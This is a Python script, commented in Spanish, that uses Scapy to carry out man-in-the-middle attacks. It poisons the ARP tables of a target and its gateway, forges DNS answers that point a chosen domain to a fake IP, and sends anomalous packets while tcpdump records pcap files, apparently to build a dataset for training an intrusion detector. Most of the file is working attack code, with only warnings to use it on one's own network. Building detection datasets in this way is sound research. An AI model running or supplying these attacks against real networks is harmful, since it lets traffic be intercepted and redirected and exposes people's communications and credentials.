#!/usr/bin/env python3
"""
Script para generar ataques MITM en entorno controlado
SOLO USAR EN TU PROPIA RED Y CON AUTORIZACIÓN
"""

import subprocess
import time
import os
import signal
import threading
from scapy.all import *
import argparse
from datetime import datetime

class MITMAttacker:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.running = False
        self.processes = []
    
    def get_network_info(self):
        """Obtener información de la red actual"""
        try:
            # Obtener gateway
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True)
            gateway = result.stdout.split()[2] if result.stdout else None
            
            # Obtener IP local
            result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
            local_ip = result.stdout.strip().split()[0] if result.stdout else None
            
            print(f"[+] Gateway detectado: {gateway}")
            print(f"[+] IP local: {local_ip}")
            
            return gateway, local_ip
        except Exception as e:
            print(f"[-] Error obteniendo info de red: {e}")
            return None, None
    
    def get_mac_address(self, ip):
        """Obtener MAC address de una IP usando ARP"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            return None
        except Exception as e:
            print(f"[-] Error obteniendo MAC de {ip}: {e}")
            return None
    
    def arp_spoof_attack(self, target_ip, gateway_ip, duration=300):
        """Ejecutar ataque ARP spoofing"""
        print(f"\n=== INICIANDO ARP SPOOFING ===")
        print(f"Objetivo: {target_ip}")
        print(f"Gateway: {gateway_ip}")
        print(f"Duración: {duration} segundos")
        
        # Habilitar IP forwarding
        os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
        
        self.running = True
        start_time = time.time()
        
        try:
            while self.running and (time.time() - start_time) < duration:
                # Envenenar víctima (decirle que somos el gateway)
                victim_packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
                send(victim_packet, verbose=False)
                
                # Envenenar gateway (decirle que somos la víctima)
                gateway_packet = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
                send(gateway_packet, verbose=False)
                
                time.sleep(2)
                
                if int(time.time() - start_time) % 30 == 0:
                    print(f"[+] ARP spoofing activo... {int(time.time() - start_time)}s")
        
        except KeyboardInterrupt:
            print("\n[!] Ataque interrumpido por usuario")
        
        finally:
            self.stop_arp_spoofing(target_ip, gateway_ip)
    
    def stop_arp_spoofing(self, target_ip, gateway_ip):
        """Restaurar tablas ARP"""
        print("[+] Restaurando tablas ARP...")
        self.running = False
        
        try:
            # Obtener MACs reales
            target_mac = self.get_mac_address(target_ip)
            gateway_mac = self.get_mac_address(gateway_ip)
            
            if target_mac and gateway_mac:
                # Restaurar ARP correcto
                restore_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                                   psrc=gateway_ip, hwsrc=gateway_mac)
                restore_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                                    psrc=target_ip, hwsrc=target_mac)
                
                send(restore_target, count=4, verbose=False)
                send(restore_gateway, count=4, verbose=False)
                print("[+] Tablas ARP restauradas")
            
            # Deshabilitar IP forwarding
            os.system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
            
        except Exception as e:
            print(f"[-] Error restaurando ARP: {e}")
    
    def dns_spoof_attack(self, target_domain="example.com", fake_ip="192.168.1.100", duration=300):
        """Ataque DNS spoofing básico"""
        print(f"\n=== INICIANDO DNS SPOOFING ===")
        print(f"Dominio objetivo: {target_domain}")
        print(f"IP falsa: {fake_ip}")
        print(f"Duración: {duration} segundos")
        
        def dns_responder(pkt):
            if pkt.haslayer(DNSQR) and target_domain in pkt[DNSQR].qname.decode():
                # Crear respuesta DNS falsa
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                             UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=fake_ip))
                send(spoofed_pkt, verbose=False)
                print(f"[+] DNS spoofed: {target_domain} -> {fake_ip}")
        
        self.running = True
        print("[+] Escuchando consultas DNS...")
        
        try:
            sniff(filter="udp port 53", prn=dns_responder, timeout=duration, 
                  stop_filter=lambda x: not self.running)
        except KeyboardInterrupt:
            print("\n[!] DNS spoofing interrumpido")
        finally:
            self.running = False
    
    def generate_malicious_traffic(self, duration=300):
        """Generar patrones de tráfico malicioso"""
        print(f"\n=== GENERANDO TRÁFICO MALICIOSO ===")
        print(f"Duración: {duration} segundos")
        
        start_time = time.time()
        self.running = True
        
        try:
            while self.running and (time.time() - start_time) < duration:
                # Enviar paquetes con patrones anómalos
                
                # 1. Ráfagas de paquetes pequeños
                for _ in range(10):
                    pkt = IP(dst="8.8.8.8")/ICMP()/"A"*10
                    send(pkt, verbose=False)
                    time.sleep(0.1)
                
                # 2. Paquetes con TTL anómalo
                pkt = IP(dst="8.8.8.8", ttl=1)/ICMP()/"TTL_ANOMALY"
                send(pkt, verbose=False)
                
                # 3. Conexiones TCP con flags anómalos
                pkt = IP(dst="192.168.1.1")/TCP(dport=80, flags="FPU")
                send(pkt, verbose=False)
                
                time.sleep(5)
                
                if int(time.time() - start_time) % 60 == 0:
                    print(f"[+] Tráfico malicioso generado... {int(time.time() - start_time)}s")
        
        except KeyboardInterrupt:
            print("\n[!] Generación interrumpida")
        finally:
            self.running = False

class MITMDatasetGenerator:
    def __init__(self, interface="wlan0", output_dir="data/raw/mitm"):
        self.interface = interface
        self.output_dir = output_dir
        self.capture_process = None
        self.attacker = MITMAttacker(interface)
    
    def start_capture(self, filename):
        """Iniciar captura de paquetes"""
        filepath = os.path.join(self.output_dir, filename)
        cmd = f"sudo tcpdump -i {self.interface} -w {filepath}"
        
        try:
            self.capture_process = subprocess.Popen(cmd.split())
            print(f"[+] Captura iniciada: {filename}")
            return True
        except Exception as e:
            print(f"[-] Error iniciando captura: {e}")
            return False
    
    def stop_capture(self):
        """Detener captura"""
        if self.capture_process:
            self.capture_process.send_signal(signal.SIGTERM)
            self.capture_process.wait()
            print("[+] Captura detenida")
    
    def generate_arp_spoofing_session(self, target_ip=None, duration=300):
        """Generar sesión con ataque ARP spoofing"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"mitm_arp_spoof_{timestamp}.pcap"
        
        # Obtener información de red si no se proporciona target
        if not target_ip:
            gateway, local_ip = self.attacker.get_network_info()
            if not gateway:
                print("[-] No se pudo obtener información de red")
                return None
            
            # Usar la IP del gateway como objetivo para demostración
            # EN PRODUCCIÓN: usar IP de otro dispositivo en la red
            target_ip = gateway
        else:
            gateway, _ = self.attacker.get_network_info()
        
        if not self.start_capture(filename):
            return None
        
        print(f"\n=== GENERANDO SESIÓN MITM: ARP SPOOFING ===")
        print("ADVERTENCIA: Solo usar en red propia")
        
        # Ejecutar ataque en hilo separado
        attack_thread = threading.Thread(
            target=self.attacker.arp_spoof_attack,
            args=(target_ip, gateway, duration)
        )
        
        try:
            attack_thread.start()
            attack_thread.join()
        except KeyboardInterrupt:
            print("\n[!] Sesión interrumpida")
            self.attacker.running = False
            attack_thread.join()
        
        self.stop_capture()
        return filename
    
    def generate_traffic_anomaly_session(self, duration=300):
        """Generar sesión con anomalías de tráfico"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"mitm_traffic_anomaly_{timestamp}.pcap"
        
        if not self.start_capture(filename):
            return None
        
        print(f"\n=== GENERANDO SESIÓN MITM: ANOMALÍAS DE TRÁFICO ===")
        
        # Ejecutar generación de tráfico anómalo
        try:
            self.attacker.generate_malicious_traffic(duration)
        except KeyboardInterrupt:
            print("\n[!] Sesión interrumpida")
        
        self.stop_capture()
        return filename

def main():
    parser = argparse.ArgumentParser(description='Generar ataques MITM para dataset')
    parser.add_argument('--attack', choices=['arp_spoof', 'traffic_anomaly'], 
                       required=True, help='Tipo de ataque')
    parser.add_argument('--duration', type=int, default=300, 
                       help='Duración en segundos')
    parser.add_argument('--target', help='IP objetivo (para ARP spoofing)')
    parser.add_argument('--interface', default='wlan0', help='Interfaz de red')
    
    args = parser.parse_args()
    
    # Verificar permisos
    if os.geteuid() != 0:
        print("[-] Este script requiere permisos de root")
        print("    Ejecuta: sudo python3 scripts/mitm_attacks.py ...")
        return
    
    # Verificar directorio
    if not os.path.exists('data/raw'):
        print("[-] Ejecuta desde el directorio raíz del proyecto")
        return
    
    # Crear directorio de ataques
    os.makedirs('data/raw/mitm', exist_ok=True)
    
    generator = MITMDatasetGenerator(interface=args.interface)
    
    print("=== GENERADOR DE ATAQUES MITM ===")
    print("ADVERTENCIA: Solo usar en red propia y con autorización")
    print("Presiona Ctrl+C para detener en cualquier momento")
    
    if args.attack == 'arp_spoof':
        filename = generator.generate_arp_spoofing_session(
            target_ip=args.target, duration=args.duration
        )
    elif args.attack == 'traffic_anomaly':
        filename = generator.generate_traffic_anomaly_session(duration=args.duration)
    
    if filename:
        print(f"\n[+] Sesión de ataque guardada: {filename}")
        print("Siguiente paso: python3 scripts/extract_features.py")

if __name__ == "__main__":
    main()
